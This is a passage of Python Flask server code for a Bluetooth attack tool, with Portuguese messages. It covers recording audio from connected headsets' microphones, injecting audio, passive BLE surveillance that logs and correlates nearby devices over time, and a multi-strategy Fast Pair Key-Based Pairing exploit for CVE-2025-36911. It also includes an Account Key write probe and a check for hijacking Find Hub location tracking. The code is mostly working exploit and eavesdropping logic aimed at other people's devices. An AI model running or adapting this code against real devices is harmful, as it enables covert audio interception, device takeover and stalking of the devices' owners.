                    "Nenhuma fonte Bluetooth de áudio detectada para " + mode_label + ". " +
                    ("Device precisa estar conectado via A2DP/HFP; para A2DP deve haver áudio tocando no device. "
                     "Execute WhisperPair Flow primeiro para conectar o device."
                     if capture_mode != "mic"
                     else "Device precisa suportar HFP/HSP e expor microfone para o host.") +
                    " Comando manual (sem sudo): " + manual
                )
                return

        if not _is_bt_source_name(bt_source):
            job["status"] = "error"
            job["error"] = "Fonte recusada por segurança: '{}' não é uma source BlueZ.".format(bt_source)
            return

        # Step 5: Record — launch as non-blocking Popen for cancel support
        _step("record")
        job["status"] = "recording"
        cmd = ["parecord", "--device=" + bt_source,
               "--file-format=wav", "--rate=16000", "--channels=1", filepath]

        import os as _os2
        try:
            preexec = _drop if real_uid and _os2.geteuid() == 0 else None
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.PIPE,
                                    env=pulse_env, preexec_fn=preexec)
            _RECORD_PROCS[job_id] = proc

            # Wait with elapsed counter
            start = _t.time()
            while proc.poll() is None:
                elapsed = _t.time() - start
                job["elapsed"] = int(elapsed)
                if elapsed >= duration:
                    proc.terminate()
                    _t.sleep(0.5)
                    break
                _t.sleep(0.5)

            proc.wait(timeout=3)
            _RECORD_PROCS.pop(job_id, None)

        except Exception as e:
            job["details"] += " | parecord error: " + str(e)[:100]

        # PipeWire fallback: some Kali/PipeWire setups expose BlueZ nodes but
        # parecord exits without creating a usable WAV.
        if (not _os2.path.exists(filepath) or _os2.path.getsize(filepath) <= 44 + 1000):
            _step("pw_record_fallback")
            try:
                if _os2.path.exists(filepath):
                    _os2.remove(filepath)
                rpw = _run_user(["pw-record", "--target", bt_source,
                                 "--format", "s16le", "--rate", "16000",
                                 "--channels", "1", filepath],
                                t=duration + 5)
                if rpw and rpw.returncode != 0:
                    job["details"] += " | pw-record: " + _err(rpw).strip()[:100]
                else:
                    job["backend"] = "pw-record"
            except Exception as e:
                job["details"] += " | pw-record error: " + str(e)[:100]

        # Step 4: Validate
        if _os2.path.exists(filepath):
            sz = _os2.path.getsize(filepath)
            WAV_HEADER = 44  # empty WAV = just header
            if sz > WAV_HEADER + 1000:  # > 1KB of actual audio
                job["status"] = "done"
                job["file"] = filename
                job["size"] = sz
                job["backend"] = job.get("backend") or "parecord"
            else:
                job["status"] = "error"
                job["error"] = ("Arquivo gerado mas muito pequeno ({} bytes = sem áudio). "
                                "BT source '{}' não produziu áudio. "
                                "Tente ativar o perfil HFP manualmente: "
                                "bluetoothctl connect {} && pactl set-card-profile "
                                "bluez_card.{} headset-head-unit").format(
                                sz, bt_source, mac, mac.replace(":", "_"))
                job["file"] = filename  # Still provide for download
                job["size"] = sz
        else:
            job["status"] = "error"
            job["error"] = "Arquivo de gravação não criado. parecord falhou."

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return jsonify({"job_id": job_id, "status": "connecting", "mac": mac, "duration": duration,
                    "message": "Poll /api/audio/record-status/" + job_id})


@app.route("/api/audio/record-status/<job_id>", methods=["GET"])
def audio_record_status(job_id):
    """Poll recording job status."""
    if not hasattr(STATE, "_rec_jobs") or job_id not in STATE._rec_jobs:
        return jsonify({"error": "Job not found"}), 404
    _archive_recording_job(job_id, STATE._rec_jobs[job_id])
    return jsonify(STATE._rec_jobs[job_id])


@app.route("/api/audio/record-stop/<job_id>", methods=["POST"])
def audio_record_stop(job_id):
    """Stop a running recording and finalize the file."""
    proc = _RECORD_PROCS.get(job_id)
    if proc and proc.poll() is None:
        proc.terminate()
        import time as _t2; _t2.sleep(0.5)
        try: proc.wait(timeout=2)
        except Exception: proc.kill()
        _RECORD_PROCS.pop(job_id, None)

    if hasattr(STATE, "_rec_jobs") and job_id in STATE._rec_jobs:
        job = STATE._rec_jobs[job_id]
        filepath = "captures/" + (job.get("file") or "whisper_{}.wav".format(job_id))
        import os as _os3
        if _os3.path.exists(filepath):
            sz = _os3.path.getsize(filepath)
            job["size"] = sz
            job["status"] = "done" if sz > 44 + 1000 else "error"
            if job["status"] == "error":
                job["error"] = "Gravação encerrada manualmente — arquivo muito pequeno ({} bytes).".format(sz)
        else:
            job["status"] = "stopped"
        _archive_recording_job(job_id, job)
        return jsonify(job)
    return jsonify({"error": "Job not found"}), 404


@app.route("/api/audio/inject", methods=["POST"])
def audio_inject():
    """Inject audio (1kHz tone) to vulnerable device via A2DP."""
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    if not mac: return jsonify({"error": "MAC required"}), 400

    try:
        # Connect to device
        subprocess.run(["bluetoothctl", "connect", mac], capture_output=True, timeout=10)
        time.sleep(2)

        # Generate and play a 1kHz tone for 3 seconds
        import struct, wave
        tone_file = "/tmp/bleak_tone.wav"
        with wave.open(tone_file, 'w') as w:
            w.setnchannels(1)
            w.setsampwidth(2)
            w.setframerate(16000)
            for i in range(16000 * 3):
                import math
                sample = int(32767 * 0.5 * math.sin(2 * math.pi * 1000 * i / 16000))
                w.writeframes(struct.pack('<h', sample))

        r = subprocess.run(["paplay", tone_file], capture_output=True, timeout=10)
        return jsonify({"success": True, "note": "Tom 1kHz enviado por 3s ao device via A2DP"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})
    finally:
        subprocess.run(["bluetoothctl", "disconnect", mac], capture_output=True, timeout=5)


@app.route("/api/audio/download/<filename>", methods=["GET"])
def audio_download(filename):
    import os
    filepath = os.path.join("captures", filename)
    if os.path.isfile(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({"error": "File not found"}), 404

@app.route("/api/audio/ping", methods=["GET", "POST"])
def audio_ping():
    """Simple test to verify audio routes are loaded."""
    return jsonify({"pong": True, "version": APP_VERSION, "routes": [
        "/api/audio/whisper-test",
        "/api/audio/record", 
        "/api/audio/inject",
        "/api/audio/download/<filename>",
    ]})



# ═══════════════════════════════════════════════════════════════════
# ═══ BLUEHOOD SURVEILLANCE — Passive BLE Intelligence (V14) ════════
# ═══════════════════════════════════════════════════════════════════
# Inspired by BlueHood (dannymcc/bluehood) and WhisperPair research
# (KU Leuven, CVE-2025-36911). Passively monitors BLE environment,
# classifies devices, detects behavioral patterns, and flags
# Fast Pair targets — without ever connecting to any device.
# ═══════════════════════════════════════════════════════════════════

import collections as _col
import json as _json

# ── BlueHood State ─────────────────────────────────────────────────
class _BHState:
    def __init__(self):
        self.running = False
        self.devices = {}          # mac -> device record
        self.sightings = []        # list of {mac, ts, rssi}
        self.correlations = {}     # frozenset(mac1,mac2) -> count
        self.start_time = None
        self.scan_count = 0
        self.stop_flag = False

BH = _BHState()

# OUI prefix → vendor (condensed, most common BLE vendors)
_OUI = {
    "00:00:00": "Xerox",
    "00:1A:7D": "Bose",
    "04:CB:A8": "Apple",
    "04:E9:E5": "Apple",
    "08:6D:41": "Apple",
    "0C:3E:9F": "Apple",
    "10:2C:6B": "Apple",
    "18:F1:D8": "Apple",
    "1C:36:BB": "Apple",
    "28:39:26": "Apple",
    "34:AB:37": "Apple",
    "3C:06:30": "Apple",
    "40:4D:7F": "Apple",
    "44:65:0D": "Apple",
    "4C:57:CA": "Apple",
    "58:55:CA": "Apple",
    "70:3C:69": "Apple",
    "74:75:48": "Apple",
    "78:4F:43": "Apple",
    "A8:91:3D": "Apple",
    "B8:78:2E": "Apple",
    "D0:03:4B": "Apple",
    "E8:D0:FC": "Apple",
    "F0:B4:29": "Apple",
    "00:02:72": "Samsung",
    "00:21:19": "Samsung",
    "04:18:D6": "Samsung",
    "08:08:C2": "Samsung",
    "20:64:32": "Samsung",
    "38:16:D1": "Samsung",
    "40:0E:85": "Samsung",
    "50:01:BB": "Samsung",
    "5C:49:7D": "Samsung",
    "8C:79:F5": "Samsung",
    "A0:0B:BA": "Samsung",
    "B4:37:D1": "Samsung",
    "CC:07:AB": "Samsung",
    "00:0C:E7": "Sony",
    "00:1D:BA": "Sony",
    "10:4F:A8": "Sony",
    "2C:FD:A1": "Sony",
    "3C:62:00": "Sony",
    "AC:9B:0A": "Sony",
    "00:18:09": "Jabra/GN Audio",
    "A4:15:66": "Jabra",
    "04:5D:4B": "JBL/Harman",
    "58:A5:F2": "Edifier",
    "7C:D5:F7": "Xiaomi",
    "28:6C:07": "Xiaomi",
    "64:09:80": "Xiaomi",
    "0C:1D:AF": "Nothing",
    "00:0F:F6": "Anker",
    "74:F6:1C": "Anker/Soundcore",
    "9C:B6:D0": "Logitech",
    "00:1F:20": "Logitech",
    "00:E0:4C": "Google",
    "00:1A:11": "Google",
    "54:60:09": "Google",
}

_SVC_CLASSIFY = {
    "0000180d": "Wearable (Heart Rate)",
    "0000180f": "Wearable (Battery)",
    "0000180a": "IoT Device",
    "0000fe2c": "Audio (Fast Pair)",
    "0000111e": "Audio (HFP)",
    "0000110b": "Audio (A2DP Sink)",
    "0000110a": "Audio (A2DP Source)",
    "0000111f": "Audio (HFP AG)",
    "00001812": "HID (Keyboard/Mouse)",
    "6e400001": "BLE Serial (Nordic UART)",
    "0000fe59": "DFU (Nordic)",
}

def _oui_vendor(mac):
    prefix = mac.upper()[:8]
    return _OUI.get(prefix, "")

def _classify_device(adv_data, name, mac):
    """Classify device type from UUIDs, name, OUI."""
    name_l = (name or "").lower()
    # Name-based
    for kw, label in [
        ("iphone", "Phone (iPhone)"), ("android", "Phone (Android)"),
        ("galaxy", "Phone (Samsung)"), ("pixel", "Phone (Google)"),
        ("airpods", "Audio (AirPods)"), ("buds", "Audio (Earbuds)"),
        ("headphone", "Audio (Headphones)"), ("speaker", "Audio"),
        ("watch", "Wearable (Watch)"), ("band", "Wearable (Band)"),
        ("car", "Vehicle"), ("obd", "Vehicle (OBD)"),
        ("keyboard", "HID (Keyboard)"), ("mouse", "HID (Mouse)"),
        ("laptop", "Computer"), ("mac", "Computer (Mac)"),
        ("printer", "Printer"), ("tv", "Smart TV"),
    ]:
        if kw in name_l:
            return label
    # UUID-based
    for uuid, label in _SVC_CLASSIFY.items():
        for u in (adv_data.get("uuids") or []):
            if uuid in u.lower():
                return label
    # OUI-based
    vendor = _oui_vendor(mac)
    if vendor:
        if vendor in ("Apple",):
            return "Apple Device"
        if vendor in ("Samsung",):
            return "Samsung Device"
        if vendor in ("Sony", "Jabra", "JBL/Harman", "Edifier", "Anker/Soundcore"):
            return "Audio Device"
    return "Unknown"

def _is_random_mac(mac):
    """True if locally administered (randomized) MAC."""
    try:
        b = int(mac.split(":")[0], 16)
        return bool(b & 0x02)
    except Exception:
        return False

def _bluehood_scan_cycle(scan_secs=5):
    """One scan cycle — returns list of {mac, name, rssi, uuids, mfr, fp}."""
    import asyncio as _aio
    from bleak import BleakScanner as _BS
    results = []
    loop = _aio.new_event_loop()
    _aio.set_event_loop(loop)
    try:
        try:
            devs = loop.run_until_complete(_BS.discover(timeout=scan_secs, return_adv=True))
            for addr, (dev, adv) in devs.items():
                rssi = getattr(adv, "rssi", -99) or -99
                uuids = list(adv.service_uuids or [])
                mfr = adv.manufacturer_data or {}
                is_fp = any("fe2c" in u.lower() for u in uuids) or (0x00E0 in mfr)
                results.append({
                    "mac": addr.upper(),
                    "name": getattr(dev, "name", None) or "",
                    "rssi": rssi,
                    "uuids": uuids,
                    "mfr_keys": list(mfr.keys()),
                    "fp": is_fp,
                    "random_mac": _is_random_mac(addr),
                })
        except TypeError:
            devs = loop.run_until_complete(_BS.discover(timeout=scan_secs))
            for dev in devs:
                results.append({
                    "mac": dev.address.upper(),
                    "name": getattr(dev, "name", None) or "",
                    "rssi": getattr(dev, "rssi", -99) or -99,
                    "uuids": [],
                    "mfr_keys": [],
                    "fp": False,
                    "random_mac": _is_random_mac(dev.address),
                })
    except Exception:
        pass
    finally:
        loop.close()
    return results

def _bluehood_loop():
    import time as _t
    BH.start_time = _t.time()
    BH.scan_count = 0
    WINDOW = 30  # seconds for correlation window

    while BH.running and not BH.stop_flag:
        now = _t.time()
        devices_this_cycle = set()

        try:
            found = _bluehood_scan_cycle(scan_secs=6)
        except Exception:
            found = []

        BH.scan_count += 1

        for d in found:
            mac = d["mac"]
            if d["random_mac"]:
                continue  # skip randomized MACs — not useful for tracking

            devices_this_cycle.add(mac)
            ts = now

            # Update device record
            if mac not in BH.devices:
                BH.devices[mac] = {
                    "mac": mac,
                    "name": d["name"],
                    "vendor": _oui_vendor(mac),
                    "type": _classify_device(d, d["name"], mac),
                    "fp": d["fp"],
                    "random_mac": d["random_mac"],
                    "first_seen": ts,
                    "last_seen": ts,
                    "sightings": 1,
                    "rssi_min": d["rssi"],
                    "rssi_max": d["rssi"],
                    "rssi_last": d["rssi"],
                    "sessions": 1,
                    "uuids": d["uuids"],
                    "hourly": {},
                }
            else:
                rec = BH.devices[mac]
                if d["name"] and not rec["name"]:
                    rec["name"] = d["name"]
                if d["uuids"] and not rec["uuids"]:
                    rec["uuids"] = d["uuids"]
                rec["last_seen"] = ts
                rec["sightings"] += 1
                rec["rssi_last"] = d["rssi"]
                rec["rssi_min"] = min(rec["rssi_min"], d["rssi"])
                rec["rssi_max"] = max(rec["rssi_max"], d["rssi"])
                # Session: new session if gap > 5 min
                if rec.get("_last_cycle_ts") and (ts - rec["_last_cycle_ts"]) > 300:
                    rec["sessions"] += 1
                rec["_last_cycle_ts"] = ts

            # Hourly heatmap
            hour_key = str(int(now // 3600) % 24)
            BH.devices[mac].setdefault("hourly", {})
            BH.devices[mac]["hourly"][hour_key] = BH.devices[mac]["hourly"].get(hour_key, 0) + 1

            # Sightings log (keep last 500)
            BH.sightings.append({"mac": mac, "ts": ts, "rssi": d["rssi"]})
            if len(BH.sightings) > 500:
                BH.sightings.pop(0)

        # Correlate: devices seen together within this cycle
        macs_list = list(devices_this_cycle)
        for i in range(len(macs_list)):
            for j in range(i + 1, len(macs_list)):
                key = "|".join(sorted([macs_list[i], macs_list[j]]))
                BH.correlations[key] = BH.correlations.get(key, 0) + 1

        _t.sleep(2)  # pause between cycles

@app.route("/api/bluehood/start", methods=["POST"])
def bluehood_start():
    """Start BlueHood passive BLE surveillance."""
    if BH.running:
        return jsonify({"status": "already_running", "scan_count": BH.scan_count})
    BH.running = True
    BH.stop_flag = False
    BH.devices = {}
    BH.sightings = []
    BH.correlations = {}
    BH.scan_count = 0
    t = threading.Thread(target=_bluehood_loop, daemon=True)
    t.start()
    return jsonify({"status": "started"})

@app.route("/api/bluehood/stop", methods=["POST"])
def bluehood_stop():
    BH.running = False
    BH.stop_flag = True
    return jsonify({"status": "stopped", "scan_count": BH.scan_count,
                    "total_devices": len(BH.devices)})

@app.route("/api/bluehood/status", methods=["GET"])
def bluehood_status():
    import time as _t
    uptime = int(_t.time() - BH.start_time) if BH.start_time else 0
    # Build device list (exclude random MACs unless FP-flagged)
    devices = []
    for rec in BH.devices.values():
        if rec["random_mac"] and not rec["fp"]:
            continue
        devices.append({
            "mac":        rec["mac"],
            "name":       rec["name"] or "Unknown",
            "vendor":     rec["vendor"],
            "type":       rec["type"],
            "fp":         rec["fp"],
            "sightings":  rec["sightings"],
            "sessions":   rec["sessions"],
            "rssi_last":  rec["rssi_last"],
            "rssi_min":   rec["rssi_min"],
            "rssi_max":   rec["rssi_max"],
            "first_seen": rec["first_seen"],
            "last_seen":  rec["last_seen"],
            "hourly":     rec.get("hourly", {}),
            "uuids":      rec.get("uuids", []),
        })

    # Top correlations
    top_corr = sorted(BH.correlations.items(), key=lambda x: x[1], reverse=True)[:10]
    correlations = [{"pair": k, "count": v} for k, v in top_corr if v >= 3]

    return jsonify({
        "running":      BH.running,
        "scan_count":   BH.scan_count,
        "uptime":       uptime,
        "total_devices": len(devices),
        "devices":      sorted(devices, key=lambda x: -x["sightings"]),
        "correlations": correlations,
        "fp_targets":   [d for d in devices if d["fp"]],
    })


# ═══════════════════════════════════════════════════════════════════
# ═══ WHISPERPAIR KBP — Multi-Strategy (V14) ════════════════════════
# ═══════════════════════════════════════════════════════════════════
# Based on research: KU Leuven CVE-2025-36911, DIY_WhisperPair
# (SpectrixDev), PentHertz/CVE-2025-36911-exploit.
#
# Three KBP strategies in order of spec-compliance:
#  1. RAW_KBP        — 16-byte plain request (broken impls — easiest)
#  2. RAW_WITH_PUBKEY — 16-byte header + 64-byte ECDH pubkey (spec-ish)
#  3. FLAGS_INITIATE  — flags=0x11 (INITIATE_BONDING|EXTENDED_RESPONSE)
#
# A device that responds to ANY strategy without being in pairing mode
# is vulnerable to WhisperPair.
# ═══════════════════════════════════════════════════════════════════

def _build_kbp_raw(provider_mac_bytes):
    """Strategy 1: Raw 16-byte KBP request. No encryption, no pubkey.
    Vulnerable devices accept this because they don't validate the payload."""
    import os as _os
    salt = _os.urandom(8)
    seeker = bytes([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF])
    # [Type=0x00][Flags=0x00][Provider(6B)][Seeker(6B)][Salt-prefix(2B)] → 16B
    raw = bytes([0x00, 0x00]) + provider_mac_bytes + seeker + salt[:2]
    return raw[:16]

def _build_kbp_with_pubkey(provider_mac_bytes):
    """Strategy 2: 16-byte KBP block + 64-byte dummy ECDH public key = 80 bytes.
    Some devices require the public key to even process the request."""
    import os as _os
    block = _build_kbp_raw(provider_mac_bytes)
    # Flags bit 1 set = seeker requests provider to include ECDH key in response
    block = bytes([0x00, 0x02]) + block[2:]
    # 64-byte dummy public key (uncompressed EC point — structurally valid prefix)
    pubkey = bytes([0x04]) + _os.urandom(63)
    return block + pubkey  # 80 bytes

def _build_kbp_zwhisper_compact(provider_mac_bytes):
    """zwhisper-linux compact request: message type 0x00 + 64-byte public key."""
    import os as _os
    return bytes([0x00]) + _os.urandom(64)

def _build_kbp_initiate(provider_mac_bytes):
    """Strategy 3: Flags=0x11 (bit0=RequestDeviceAction + bit4=ExtendedResponse).
    Used by DIY_WhisperPair for_verification() — triggers bonding attempt."""
    import os as _os
    salt = _os.urandom(8)
    seeker = bytes([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF])
    raw = bytes([0x00, 0x11]) + provider_mac_bytes + seeker + salt[:2]
    return raw[:16]

def _parse_kbp_response(data):
    """Parse KBP response notification.
    Vulnerable device returns: [Type=0x01][Enc Provider BR/EDR addr(6B)][Salt(8B)]
    = 16 bytes minimum. The BR/EDR address can be used for Classic BT pairing."""
    if len(data) < 16:
        return {"valid": False, "reason": "too_short", "len": len(data)}
    msg_type = data[0]
    # Type 0x01 = KBP response with provider address
    if msg_type == 0x01:
        br_edr_enc = data[1:7]
        salt = data[7:15] if len(data) >= 15 else b""
        return {
            "valid": True,
            "type": "kbp_response",
            "msg_type": hex(msg_type),
            "br_edr_encrypted": br_edr_enc.hex(),
            "salt": salt.hex(),
            "raw_hex": data.hex(),
        }
    return {
        "valid": True,
        "type": "unknown_response",
        "msg_type": hex(msg_type),
        "raw_hex": data.hex(),
    }

@app.route("/api/audio/whisperpair-kbp", methods=["POST"])
def audio_whisperpair_kbp():
    """Multi-strategy KBP vulnerability test — V14 improved.

    Tries RAW_KBP → RAW_WITH_PUBKEY → FLAGS_INITIATE in order.
    First strategy that gets a notification response → VULNERABLE.
    Uses bluetoothctl to register device in BlueZ before BleakClient.
    Non-blocking — poll /api/audio/whisperpair-status/<job_id>.
    """
    try:
        data = request.get_json(silent=True) or {}
        mac = data.get("mac", "").strip().upper()
        if not mac:
            return jsonify({"error": "MAC required"}), 400

        job_id = "kbp_{}_{}".format(mac.replace(":", "_"), int(time.time()))
        if not hasattr(STATE, "_wp_jobs"):
            STATE._wp_jobs = {}
        job = {
            "job_id":   job_id,
            "mac":      mac,
            "status":   "running",
            "step":     "init",
            "steps":    [],
            "verdict":  None,
            "details":  "",
            "strategy": None,
            "kbp_response": None,
        }
        STATE._wp_jobs[job_id] = job

        def _step(msg):
            job["steps"].append(msg)
            job["step"] = msg

        def _btctl_register(target_mac, wait=5):
            """Force BlueZ to register device via bluetoothctl scan."""
            import subprocess as _sp, time as _t
            info = _sp.run(["bluetoothctl", "info", target_mac],
                           capture_output=True, text=True, timeout=4).stdout
            if "Device " + target_mac in info:
                return True

            proc = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                             stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
            try:
                proc.stdin.write("scan on\n")
                proc.stdin.flush()
                _t.sleep(wait)
                proc.stdin.write("scan off\nquit\n")
                proc.stdin.flush()
                proc.communicate(timeout=3)
            except Exception:
                try: proc.kill()
                except: pass

            info2 = _sp.run(["bluetoothctl", "info", target_mac],
                            capture_output=True, text=True, timeout=4).stdout
            return "Device " + target_mac in info2

        def _run_kbp():
            import asyncio, os
            from bleak import BleakClient, BleakScanner

            UUID_FP_SERVICE = "0000fe2c-0000-1000-8000-00805f9b34fb"
            UUID_KBP_CHAR   = "fe2c1236-8366-4814-8eb0-01de32100bea"

            try:
                provider_bytes = bytes.fromhex(mac.replace(":", ""))
            except Exception:
                job.update({"verdict": "ERROR", "details": "MAC inválido", "status": "done"})
                return

            strategies = [
                ("RAW_KBP_16B",      _build_kbp_raw(provider_bytes)),
                ("ZWHISPER_65B",     _build_kbp_zwhisper_compact(provider_bytes)),
                ("RAW_WITH_PUBKEY",  _build_kbp_with_pubkey(provider_bytes)),
                ("FLAGS_INITIATE",   _build_kbp_initiate(provider_bytes)),
            ]

            # Register device in BlueZ
            _step("bluez_register")
            _btctl_register(mac, wait=5)

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                async def _test():
                    _step("gatt_connect")
                    try:
                        async with BleakClient(mac, timeout=25) as client:
                            if not client.is_connected:
                                job.update({"verdict": "UNCERTAIN",
                                            "details": "GATT connection refused",
                                            "status": "done"})
                                return

                            _step("service_discovery")
                            fp_svc = next((s for s in client.services
                                           if "fe2c" in s.uuid.lower()), None)

                            if fp_svc is None:
                                job.update({
                                    "verdict": "PATCHED",
                                    "details": ("🟢 Conectado — sem serviço 0xFE2C. "
                                                "Não implementa Fast Pair ou está patched."),
                                    "status": "done"})
                                return

                            kbp_char = next((c for c in fp_svc.characteristics
                                             if "1236" in c.uuid.lower()
                                             and ("write" in [p.lower() for p in c.properties]
                                                  or "write-without-response" in [p.lower() for p in c.properties])),
                                            None)
                            if kbp_char is None:
                                kbp_char = next((c for c in fp_svc.characteristics
                                                 if any(s in c.uuid.lower() for s in ["1234","1237","1238","1235","1233"])
                                                 and ("write" in [p.lower() for p in c.properties]
                                                      or "write-without-response" in [p.lower() for p in c.properties])),
                                                None)
                            if kbp_char is None:
                                job.update({"verdict": "UNCERTAIN",
                                            "details": "FP service presente mas KBP char ausente",
                                            "status": "done"})
                                return

                            # Try each strategy
                            for strat_name, payload in strategies:
                                _step("kbp_{}".format(strat_name))
                                job["strategy"] = strat_name

                                response_received = []
                                def _notify(sender, data):
                                    response_received.append(bytes(data))

                                # Enable notifications
                                try:
                                    if "notify" in [p.lower() for p in kbp_char.properties]:
                                        await client.start_notify(kbp_char.uuid, _notify)
                                except Exception:
                                    pass

                                # Write payload
                                write_ok = False
                                try:
                                    await client.write_gatt_char(
                                        kbp_char.uuid, payload, response=False)
                                    write_ok = True
                                except Exception as we:
                                    job["details"] += " | {} rejected: {}".format(
                                        strat_name, str(we)[:60])
                                    try: await client.stop_notify(kbp_char.uuid)
                                    except: pass
                                    continue  # try next strategy

                                # Wait for notification
                                await asyncio.sleep(2.5)

                                try: await client.stop_notify(kbp_char.uuid)
                                except: pass

                                if response_received:
                                    resp_bytes = response_received[0]
                                    parsed = _parse_kbp_response(resp_bytes)
                                    job.update({
                                        "verdict": "VULNERABLE",
                                        "strategy": strat_name,
                                        "kbp_response": parsed,
                                        "details": (
                                            "🔴 VULNERÁVEL — Device respondeu ao probe KBP "
                                            "sem estar em pairing mode. "
                                            "Estratégia: {}. "
                                            "Resposta ({} bytes): {}... "
                                            "BR/EDR addr enc: {}".format(
                                                strat_name,
                                                len(resp_bytes),
                                                resp_bytes.hex()[:32],
                                                parsed.get("br_edr_encrypted", "?"))
                                        ),
                                        "status": "done"
                                    })
                                    return  # Stop at first vulnerability confirmed

                            # All strategies tried — no response
                            # Final check: is Account Key char writable without auth?
                            acct_key_vuln = False
                            acct_char = next(
                                (c for s in client.services
                                   for c in s.characteristics
                                   if ("1238" in c.uuid.lower() or "1235" in c.uuid.lower())
                                   and "write" in [p.lower() for p in c.properties]),
                                None
                            )
                            if acct_char:
                                # Probe with type=0x04 (owner key) + zeros (invalid, won't register)
                                probe_key = bytes([0x04]) + bytes(15)
                                try:
                                    await client.write_gatt_char(
                                        acct_char.uuid, probe_key, response=True)
                                    acct_key_vuln = True
                                except Exception as _ak_e:
                                    _ak_err = str(_ak_e).lower()
                                    # NOT_PERMITTED / INSUFFICIENT_AUTH = protected (PATCHED)
                                    if not any(k in _ak_err for k in ["not permitted","insufficient","authentication"]):
                                        acct_key_vuln = True  # accepted or rejected for wrong reason

                            if acct_key_vuln:
                                job.update({
                                    "verdict": "VULNERABLE",
                                    "details": ("🔴 VULNERÁVEL — Account Key char (0xFE2C1238/1235) "
                                                "aceita write sem autenticação (probe type=0x04). "
                                                "Confirme com Find Hub Check para risco de tracking."),
                                    "status": "done"
                                })
                            else:
                                job.update({
                                    "verdict": "PATCHED",
                                    "details": ("🟢 Todas as estratégias KBP rejeitadas ou sem resposta. "
                                                "Account Key char protegida. "
                                                "Device provavelmente patched para CVE-2025-36911."),
                                    "status": "done"
                                })

                    except Exception as e:
                        err = str(e)
                        detail = ("⚠ BlueZ não encontrou o device no DBus — "
                                  "desconecte do celular e tente novamente."
                                  if "not found" in err.lower()
                                  else "Erro GATT: " + err[:120])
                        job.update({"verdict": "UNCERTAIN",
                                    "details": detail,
                                    "status": "done"})

                loop.run_until_complete(_test())
            except Exception as e:
                job.update({"verdict": "UNCERTAIN",
                            "details": "Flow error: " + str(e)[:120],
                            "status": "done"})
            finally:
                loop.close()

        t = threading.Thread(target=_run_kbp, daemon=True)
        t.start()

        return jsonify({"job_id": job_id, "status": "running", "mac": mac,
                        "message": "KBP multi-strategy test started. Poll /api/audio/whisperpair-status/" + job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/audio/find-hub-check", methods=["POST"])
def audio_find_hub_check():
    """Check if device can be registered to attacker's Find Hub (location tracking).

    Per CVE-2025-36911: if a device has never been paired to an Android account,
    its Account Key slot is empty. Writing an Account Key registers the device
    to the attacker's Google account via Find Hub — enabling stalking.

    This check ONLY reads/detects — does NOT write anything.
    Flags if Account Key char is writable without encryption.
    """
    try:
        data = request.get_json(silent=True) or {}
        mac = data.get("mac", "").strip().upper()
        if not mac:
            return jsonify({"error": "MAC required"}), 400

        job_id = "fhc_{}_{}".format(mac.replace(":", "_"), int(time.time()))
        if not hasattr(STATE, "_wp_jobs"):
            STATE._wp_jobs = {}
        job = {"job_id": job_id, "mac": mac, "status": "running",
               "step": "init", "steps": [], "verdict": None, "details": ""}
        STATE._wp_jobs[job_id] = job

        def _step(m): job["steps"].append(m); job["step"] = m

        def _run():
            import asyncio, subprocess as _sp, time as _t
            from bleak import BleakClient

            # Register in BlueZ
            _step("bluez_register")
            try:
                proc = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                                 stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
                proc.stdin.write("scan on\n"); proc.stdin.flush()
                _t.sleep(4)
                proc.stdin.write("scan off\nquit\n"); proc.stdin.flush()
                proc.communicate(timeout=3)
            except Exception:
                try: proc.kill()
                except: pass

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                async def _check():
                    _step("gatt_connect")
                    try:
                        async with BleakClient(mac, timeout=25) as client:
                            if not client.is_connected:
                                job.update({"verdict": "UNCERTAIN",
                                            "details": "GATT connection refused",
                                            "status": "done"})
                                return

                            _step("service_discovery")
                            fp_svc = next((s for s in client.services
                                           if "fe2c" in s.uuid.lower()), None)
                            if fp_svc is None:
                                job.update({"verdict": "NOT_APPLICABLE",
                                            "details": "Sem serviço Fast Pair (0xFE2C) — não sujeito a Find Hub tracking",
                                            "status": "done"})
                                return

                            _step("account_key_check")
                            acct_char = next(
                                (c for c in fp_svc.characteristics
                                 if "1238" in c.uuid.lower()), None)
                            if acct_char is None:
                                acct_char = next(
                                    (c for c in fp_svc.characteristics
                                     if "1235" in c.uuid.lower()), None)

                            if acct_char is None:
                                job.update({"verdict": "UNCERTAIN",
                                            "details": "Account Key char (0xFE2C1238/1235) não encontrada",
                                            "status": "done"})
                                return

                            props = [p.lower() for p in acct_char.properties]
                            can_write = "write" in props or "write-without-response" in props
                            requires_auth = "authenticated-signed-writes" in props

                            # Try reading to see if already has keys
                            existing_key = None
                            if "read" in props:
                                try:
                                    val = await client.read_gatt_char(acct_char.uuid)
                                    existing_key = val.hex() if val else None
                                except Exception:
                                    pass

                            risk = "HIGH" if (can_write and not requires_auth) else \
                                   "MEDIUM" if can_write else "LOW"

                            detail = ""
                            if risk == "HIGH":
                                detail = ("🔴 Find Hub TRACKING POSSÍVEL — "
                                          "Account Key char aceita write sem autenticação. "
                                          "Se nunca pareado com Android, atacante pode se "
                                          "tornar owner e rastrear vítima via Find Hub.")
                            elif risk == "MEDIUM":
                                detail = ("🟡 Account Key char writable (com auth). "
                                          "Risco moderado — depende da implementação de auth.")
                            else:
                                detail = ("🟢 Account Key char somente leitura ou não-writable. "
                                          "Risco de Find Hub tracking baixo.")

                            if existing_key and existing_key != "0" * 32:
                                detail += " | Key existente detectada (device já tem owner)."
                            else:
                                detail += " | Nenhuma Account Key detectada (slot vazio — risco elevado)."

                            job.update({
                                "verdict": risk,
                                "details": detail,
                                "acct_key_props": props,
                                "existing_key_detected": existing_key is not None,
                                "status": "done"
                            })

                    except Exception as e:
                        job.update({"verdict": "UNCERTAIN",
                                    "details": "Erro: " + str(e)[:120],
                                    "status": "done"})

                loop.run_until_complete(_check())
            finally:
                loop.close()

